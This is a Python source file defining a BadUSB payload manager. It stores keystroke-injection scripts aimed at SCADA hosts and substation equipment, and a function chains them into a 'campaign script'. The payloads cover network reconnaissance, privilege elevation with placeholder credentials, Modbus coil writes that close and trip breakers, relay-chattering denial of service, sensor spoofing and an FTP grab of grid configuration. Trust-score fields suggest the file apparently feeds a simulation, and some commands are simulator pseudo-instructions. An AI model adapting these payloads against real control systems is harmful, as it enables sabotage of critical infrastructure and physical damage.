import logging
from typing import Dict, Any, List

logger = logging.getLogger("hardware.badusb_manager")

class BadUSBPayloadManager:
    def __init__(self):
        # Payload Storage (Duckyscripts, operator impersonations, and telemetry spoofing scripts)
        self.payloads = {
            "recon_discovery": {
                "name": "Network Discovery Script",
                "category": "RECONNAISSANCE",
                "target": "SCADA Host",
                "trust_impact": 0.10,  # Decay trust score by 0.10
                "severity": "WARNING",
                "payload_script": [
                    "GUI r", "DELAY 500", "STRING cmd", "ENTER", "DELAY 500",
                    "STRING ipconfig /all", "ENTER", "DELAY 500",
                    "STRING netstat -an", "ENTER"
                ]
            },
            "operator_compromise": {
                "name": "Operator Impersonation Bypass",
                "category": "PRIVILEGE_ESCALATION",
                "target": "SCADA Command Console",
                "trust_impact": 0.45,
                "severity": "HIGH",
                "payload_script": [
                    "GUI r", "DELAY 500", "STRING powershell -Command Start-Process cmd -Verb RunAs", "ENTER",
                    "DELAY 1000", "STRING admin_operator_bypass_credentials", "ENTER",
                    "DELAY 500", "STRING whoami /priv", "ENTER"
                ]
            },
            "firmware_modbus_hijack": {
                "name": "Modbus Register Hijack Script",
                "category": "COMMAND_INJECTION",
                "target": "PLC Modbus register port",
                "trust_impact": 0.60,
                "severity": "CRITICAL",
                "payload_script": [
                    "DELAY 1000",
                    "WRITE_MODBUS_COIL 8 1",  # Weld breaker L7_8 CLOSED
                    "DELAY 500",
                    "WRITE_MODBUS_COIL 7 0"   # Trip L6_7 OPEN
                ]
            },
            "trust_sabotage": {
                "name": "Sensor Calibration Tampering Script",
                "category": "INTEGRITY_VIOLATION",
                "target": "Sensor Interface",
                "trust_impact": 0.35,
                "severity": "HIGH",
                "payload_script": [
                    "SPOOF_BIAS bus_5_v -0.20",
                    "DELAY 500",
                    "CORRUPT_SENSOR bus_7_v NaN"
                ]
            },
            "dos_command_flood": {
                "name": "Relay Chattering Flood (DoS)",
                "category": "DENIAL_OF_SERVICE",
                "target": "Substation Breakers",
                "trust_impact": 0.50,
                "severity": "CRITICAL",
                "payload_script": [
                    "DELAY 200",
                    "WRITE_MODBUS_COIL 8 0", "DELAY 100", "WRITE_MODBUS_COIL 8 1", "DELAY 100",
                    "WRITE_MODBUS_COIL 8 0", "DELAY 100", "WRITE_MODBUS_COIL 8 1", "DELAY 100",
                    "WRITE_MODBUS_COIL 8 0", "DELAY 100", "WRITE_MODBUS_COIL 8 1"
                ]
            },
            "credential_exfiltration": {
                "name": "Grid Config Exfiltration",
                "category": "EXFILTRATION",
                "target": "SCADA DB Server",
                "trust_impact": 0.20,
                "severity": "WARNING",
                "payload_script": [
                    "GUI r", "DELAY 500", "STRING ftp -s:exfiltrate.txt", "ENTER",
                    "DELAY 1000", "STRING get grid_config.json", "ENTER"
                ]
            }
        }
        
    def get_payload_script(self, payload_id: str) -> List[str]:
        """
        Retrieves the HID keyboard or direct hardware injection sequence.
        """
        payload = self.payloads.get(payload_id)
        return payload["payload_script"] if payload else []
        
    def get_payload_metadata(self, payload_id: str) -> Dict[str, Any]:
        """
        Returns metadata without the script body.
        """
        payload = self.payloads.get(payload_id)
        if not payload:
            return {}
        return {
            "name": payload["name"],
            "category": payload["category"],
            "target": payload["target"],
            "trust_impact": payload["trust_impact"],
            "severity": payload["severity"]
        }
        
    def get_all_payloads(self) -> List[Dict[str, Any]]:
        results = []
        for pid, data in self.payloads.items():
            results.append({
                "payload_id": pid,
                "name": data["name"],
                "category": data["category"],
                "target": data["target"],
                "trust_impact": data["trust_impact"],
                "severity": data["severity"],
                "steps_count": len(data["payload_script"])
            })
        return results

    def compile_payload_chain(self, payload_ids: List[str]) -> List[str]:
        """
        Chains multiple BadUSB payloads together into a sequenced campaign script.
        """
        compiled_script = []
        for pid in payload_ids:
            script = self.get_payload_script(pid)
            if script:
                compiled_script.append(f"STRING --- START_PAYLOAD: {pid} ---")
                compiled_script.append("ENTER")
                compiled_script.extend(script)
                compiled_script.append("DELAY 1000")  # Pause between stages
        return compiled_script
